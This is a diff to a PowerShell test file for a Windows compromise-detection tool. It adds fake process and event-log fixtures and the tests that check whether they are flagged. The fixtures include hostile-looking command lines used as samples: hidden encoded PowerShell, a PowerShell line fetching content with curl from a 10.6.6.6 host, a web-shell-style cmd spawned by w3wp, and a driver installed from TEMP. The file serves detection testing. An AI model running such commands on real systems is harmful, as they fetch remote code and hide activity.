@@ -101,7 +101,9 @@ Csv $bad processes @('ProcessId','ParentProcessId','Name','ExecutablePath','Comm
     @('3500','700','powershell.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA','20261111090000.000000-300','CORP\jsmith'),
     @('3600','3601','cmd.exe','C:\Windows\System32\cmd.exe','cmd.exe /c whoami','20261111090000.000000-300','IIS APPPOOL\Default'),
     @('3601','600','w3wp.exe','C:\Windows\System32\inetsrv\w3wp.exe','w3wp.exe -ap Default','20261111090000.000000-300','IIS APPPOOL\Default'),
-    @('3700','600','svchost.exe','C:\ProgramData\svchost.exe','C:\ProgramData\svchost.exe','20261111090000.000000-300','NT AUTHORITY\SYSTEM')
+    @('3700','600','svchost.exe','C:\ProgramData\svchost.exe','C:\ProgramData\svchost.exe','20261111090000.000000-300','NT AUTHORITY\SYSTEM'),
+    @('3800','3801','steamwebhelper.exe','C:\Program Files (x86)\Steam\bin\cef\cef.win64\steamwebhelper.exe','"C:\Program Files (x86)\Steam\bin\cef\cef.win64\steamwebhelper.exe" --type=crashpad-handler --url=https://crash.steampowered.com/submit','20261111090000.000000-300','CORP\jsmith'),
+    @('3900','700','powershell.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','powershell -c "(New-Object IO.StreamReader((curl.exe -s https://10.6.6.6/x)))"','20261111090000.000000-300','CORP\jsmith')
 )
 Csv $bad services @('Name','DisplayName','State','StartMode','PathName','StartName','ProcessId') @(
     @('DNS','DNS Server','Running','Auto','C:\Windows\system32\dns.exe','LocalSystem','2100'),
@@ -215,7 +217,10 @@ Csv $bad events @('Time','Log','Id','Detail') @(
     @('2026-11-11 09:00:00','Security','4720','Account Name=jsmith; Account Name=svc_backup$'),
     @('2026-11-11 09:01:00','Security','4732','Account Name=jsmith; Group Name=Administrators'),
     @('2026-11-11 09:02:00','System','7045','Service Name=WinUpdSvc; Service File Name=cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'),
-    @('2026-11-11 09:03:00','System','7045','Service Name=MpKslDrv; Service File Name=C:\ProgramData\Microsoft\Windows Defender\Definition Updates\x\MpKslDrv.sys')
+    @('2026-11-11 09:03:00','System','7045','Service Name=MpKslDrv; Service File Name=C:\ProgramData\Microsoft\Windows Defender\Definition Updates\x\MpKslDrv.sys'),
+    @('2026-11-11 13:06:38','System','7045','Service Name=D; Service File Name=C:\Windows\TEMP\D.sys'),
+    @('2026-11-11 13:07:49','System','7045','Service Name=D; Service File Name=C:\Windows\TEMP\D.sys'),
+    @('2026-11-11 14:21:39','System','7045','Service Name=D; Service File Name=C:\Windows\TEMP\D.sys')
 )
 Csv $bad drivers @('Name','DisplayName','State','StartMode','PathName') @(
     @('disk','Disk Driver','Running','Boot','C:\Windows\system32\drivers\disk.sys'),
@@ -386,14 +391,19 @@ T-HasNot $fl '"svchost.exe (1200)"' 'real svchost not flagged'
 T-Has $fl '"HIGH","processes","nc.exe (3300)"' 'netcat running'
 T-Has $fl '"HIGH","processes","powershell.exe (3500)","suspicious command line' 'encoded powershell'
 T-Has $fl '"HIGH","processes","cmd.exe (3600)","cmd.exe was started by w3wp.exe' 'web shell'
+T-HasNot $fl 'steamwebhelper' 'a browser-style program with a URL argument is not suspicious'
+T-Has $fl '"HIGH","processes","powershell.exe (3900)","suspicious command line' 'a shell with a URL is'
 # shares, software, updates, events, drivers, rights, roles
 T-Has $fl '"MED","shares","Public","\Everyone has Full access to share Public"' 'Everyone full on a share'
 T-HasNot $fl '"shares","NETLOGON"' 'default shares not flagged'
 T-Has $fl '"MED","software","AnyDesk"' 'remote-access tool'
 T-Has $fl '"HIGH","updates","updates","newest update is from 2020-05-20: this DC is probably open to Zerologon"' 'unpatched DC'
 T-Has $fl '"HIGH","events","2026-11-11 09:10:00 Security log cleared"' 'log cleared'
+T-Has $fl '"LOW","users","Guest","an empty password is allowed' 'password-not-required is LOW (it is set on many ordinary accounts)'
 T-Has $fl '"MED","events","2026-11-11 09:01:00 added to a local group","added to a local group: Account Name=jsmith; Group Name=Administrators"' 'admin added'
 T-Has $fl '"HIGH","events","2026-11-11 09:02:00 service installed"' 'suspicious service install is HIGH'
+T-Has $fl '"HIGH","events","service installed x3 (2026-11-11 13:06:38 to 2026-11-11 14:21:39)","service installed: Service Name=D; Service File Name=C:\Windows\TEMP\D.sys (a driver loaded from a temp folder' 'repeated events become one flag with a count'
+T-Eq ([regex]::Matches($fl, 'TEMP\\D\.sys').Count) 1 'only one flag for the repeated driver install'
 T-Has $fl '"LOW","events","2026-11-11 09:03:00 service installed"' 'ordinary service install (an update) is LOW'
 T-Has $fl '"HIGH","drivers","evil"' 'driver from Users\Public'
 T-HasNot $fl '"drivers","disk"' 'normal driver not flagged'
